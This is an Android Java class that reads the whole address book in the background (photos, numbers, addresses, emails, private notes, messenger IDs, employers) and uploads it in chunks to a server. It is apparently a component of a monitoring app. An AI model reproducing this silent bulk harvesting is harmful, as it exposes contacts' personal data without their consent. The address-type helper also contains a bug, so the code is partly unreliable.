package com.inet.android.list;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Im;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.util.Base64;

import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.Logging;

public class ListContacts extends AsyncTask<Context, Void, Void> {
	Context mContext;
	private String iType = "3";
	SharedPreferences sp;
	ArrayList<String> email = null;
	ArrayList<String> emailType = null;
	ArrayList<CharSequence> CustomemailType = null;
	private JSONObject jsonInfo;
	private JSONObject jsonPhoneType;
	private JSONObject jsonContact;
	private String LOG_TAG = "ListContacts";
	private String complete;
	private TurnSendList sendList;
	private String version;
	int imType;
	int type;

	public void readContacts() throws JSONException {
		Logging.doLog(LOG_TAG, "readContact", "readContact");
		String sendStr = null;
		ContentResolver cr = mContext.getContentResolver();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		version = sp.getString("list_contact", "0");

		String encodedImage = null;
		StringBuilder sAdress;

		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, null);

		if (sp.getBoolean("network_available", true) == true) {
			if (cur.getCount() > 0) {
				while (cur.moveToNext()) {
					complete = "0";
					jsonContact = new JSONObject();
					jsonInfo = new JSONObject();
					jsonPhoneType = new JSONObject();
					email = new ArrayList<String>();
					emailType = new ArrayList<String>();
					sAdress = new StringBuilder();
					CustomemailType = new ArrayList<CharSequence>();
					String id = cur.getString(cur
							.getColumnIndex(ContactsContract.Contacts._ID));
					long idlong = cur.getLong(cur
							.getColumnIndex(ContactsContract.Contacts._ID));
					String name = cur
							.getString(cur
									.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
					Uri uri = ContentUris.withAppendedId(
							ContactsContract.Contacts.CONTENT_URI, idlong);
					InputStream input = ContactsContract.Contacts
							.openContactPhotoInputStream(cr, uri);
					if (input != null) {

						Bitmap pic = BitmapFactory.decodeStream(input);
						ByteArrayOutputStream bos = new ByteArrayOutputStream();
						pic.compress(Bitmap.CompressFormat.PNG, 100, bos);
						byte[] bitmapdata = bos.toByteArray();
						encodedImage = Base64.encodeToString(bitmapdata,
								Base64.DEFAULT);
						if (!encodedImage.equals(" "))
							jsonContact.put("photo", encodedImage);
					}
					// ----------------------------------------------------------------------------------------------------------------------------------
					// get the phone number
					// ---------------------------------------------------------------------

					if (Integer
							.parseInt(cur.getString(cur
									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

						Cursor pCur = cr
								.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
										null,
										ContactsContract.CommonDataKinds.Phone.CONTACT_ID
												+ " = ?", new String[] { id },
										null);
						while (pCur.moveToNext()) {
							String mPhone = pCur
									.getString(pCur
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
							String phoneType = getTipe(pCur
									.getInt(pCur
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
							jsonPhoneType.put(mPhone, phoneType);
						}
						pCur.close();
					}
					// ------------------------------------------
					// Get Postal Address
					// -------------------------------------------------
					String addrWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] addrWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE };
					Cursor addrCur = cr.query(
							ContactsContract.Data.CONTENT_URI, null, addrWhere,
							addrWhereParams, null);

					if (addrCur.getCount() != 0) {
						while (addrCur.moveToNext()) {
							String country = addrCur
									.getString(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
							if (country != null)
								sAdress.append(country);
							String state = addrCur
									.getString(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
							if (state != null)
								sAdress.append(state);

							String city = addrCur
									.getString(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
							if (city != null)
								sAdress.append(city);
							String street = addrCur
									.getString(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
							if (street != null)
								sAdress.append(street);

							String postalCode = addrCur
									.getString(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
							if (postalCode != null)
								sAdress.append(postalCode);

							int type = addrCur
									.getInt(addrCur
											.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
							if (!sAdress.equals(" "))
								jsonInfo.put("адрес",
										"(" + getTipeAddress(type) + ") "
												+ sAdress.toString());
						}
					}
					addrCur.close();
					// ------------------------------------------------------------------------------------------
					// get email and type
					// -----------------------------------------------------------------------------------------------------------------------------------------
					Cursor emailCur = cr.query(
							ContactsContract.CommonDataKinds.Email.CONTENT_URI,
							null,
							ContactsContract.CommonDataKinds.Email.CONTACT_ID
									+ " = ?", new String[] { id }, null);
					while (emailCur.moveToNext()) {
						// This would allow you get several email addresses
						// if the email addresses were stored in an array

						String sEmail = emailCur
								.getString(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
						int type = emailCur
								.getInt(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
						String customLabel = emailCur
								.getString(emailCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
						CharSequence cCustomemailType = ContactsContract.CommonDataKinds.Email
								.getTypeLabel(mContext.getResources(), type,
										customLabel);
						if (sEmail != null)
							jsonInfo.put(" e-mail" + "(" + cCustomemailType
									+ "): ", sEmail);
					}
					emailCur.close();
					// ------------------------------------------
					// Get note
					// ------------------------------------------

					String noteWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] noteWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE };

					Cursor noteCur = cr.query(
							ContactsContract.Data.CONTENT_URI, null, noteWhere,
							noteWhereParams, null);
					if (noteCur.moveToFirst()) {
						String note = noteCur
								.getString(noteCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
						if (note != null) {
							if (!note.equals(""))
								jsonInfo.put("заметка", note);
						}
					}
					noteCur.close();

					// ----------------------------------------------------------------------------------------------------------------------------------------------------
					// Get Instant Messenger
					// ------------------------------------------

					String imWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] imWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
					Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
							null, imWhere, imWhereParams, null);
					if (imCur != null) {
						if (imCur.moveToFirst()) {
							for (int i = 0; i < imCur.getCount(); i++) {

								String imName = imCur
										.getString(imCur
												.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
								String imType;
								imType = getTipeIm(imCur
										.getInt(imCur
												.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL)));
								jsonInfo.put(imType, imName);
								imCur.moveToNext();
							}

						}

					}
					imCur.close();
					// ----------------------------------------------------------------------------------------------------------------------------------------------------
					// Get Organizations
					// ------------------------------------------

					String orgWhere = ContactsContract.Data.CONTACT_ID
							+ " = ? AND " + ContactsContract.Data.MIMETYPE
							+ " = ?";
					String[] orgWhereParams = new String[] {
							id,
							ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE };
					Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
							null, orgWhere, orgWhereParams, null);
					if (orgCur.moveToFirst()) {
						String orgName = orgCur
								.getString(orgCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
						String title = orgCur
								.getString(orgCur
										.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));

						if (orgName != null) {
							if (title == null)
								jsonInfo.put("организация", orgName);
							else
								jsonInfo.put("организация", orgName + " "
										+ title);
						}
					}
					orgCur.close();

					if (name != null) {
						if (!name.equals(""))
							jsonContact.put("name", name);
					}
					if (!jsonPhoneType.toString().equals("{}"))
						jsonContact.put("number", jsonPhoneType);

					jsonContact.put("info", jsonInfo);

					if (sendStr == null)
						sendStr = jsonContact.toString();
					else
						sendStr += "," + jsonContact.toString();

					if (sendStr.length() >= 50000) {
						Logging.doLog(LOG_TAG, ">= 50000", ">= 50000");
						sendRequest(sendStr, complete);
						sendStr = null;

					}
				}
				if (sendStr != null) {
					lastRaw(sendStr);
					sendStr = null;
				} else {
					lastRaw("");
					sendStr = null;
					
				}
				Logging.doLog(LOG_TAG, "cur.close()", "cur.close()");
				cur.close();
			}else{
				Logging.doLog(LOG_TAG, "contactCursor == null",
						"contactCursor == null");
				lastRaw("");
				sendStr = null;
				
			}

		} else {
			Logging.doLog(LOG_TAG, "else connect", "else connect");
			sendList = new TurnSendList(mContext);
			sendList.setList(iType, version, "0");
		}
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			Logging.doLog(LOG_TAG, "sendRequest: complete " + complete,
					"sendRequest: complete " + complete);
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
					version);
			dr.sendRequest(str);

		}
	}

	private String getTipe(int phonetype) {
		int phoneType = phonetype;
		switch (phoneType) {
		case 1:
			return "Home";
		case 2:
			return "Mobile";
		case 3:
			return "Work";
		case 4:
			return "Home Fax";
		case 5:
			return "Work Fax";
		case 6:
			return "Main";
		case 7:
			return "Other";
		case 8:
			return "Custom";
		case 9:
			return "Pager";
		}
		return "unknown";
	}

	private String getTipeIm(int imType) {
		this.imType = imType;
		switch (imType) {
		case Im.PROTOCOL_GOOGLE_TALK:
			return "GTALK";
		case Im.PROTOCOL_AIM:
			return "AIM";
		case Im.PROTOCOL_MSN:
			return "MSN";
		case Im.PROTOCOL_YAHOO:
			return "YAHOO";
		case Im.PROTOCOL_ICQ:
			return "ICQ";
		case Im.PROTOCOL_JABBER:
			return "JABBER";
		case Im.PROTOCOL_SKYPE:
			return "SKYPE";
		case Im.PROTOCOL_QQ:
			return "QQ";
		}
		return null;
	}

	private String getTipeAddress(int type) {
		this.type = type;
		switch (imType) {
		case StructuredPostal.TYPE_WORK:
			return "Work";
		case StructuredPostal.TYPE_HOME:
			return "Home";
		case StructuredPostal.TYPE_OTHER:
			return "Other";
		case StructuredPostal.TYPE_CUSTOM:
			return "Custom";
		}
		return null;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Auto-generated method stub
		this.mContext = params[0];
		Logging.doLog(LOG_TAG, "doIn");
		try {
			readContacts();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

}
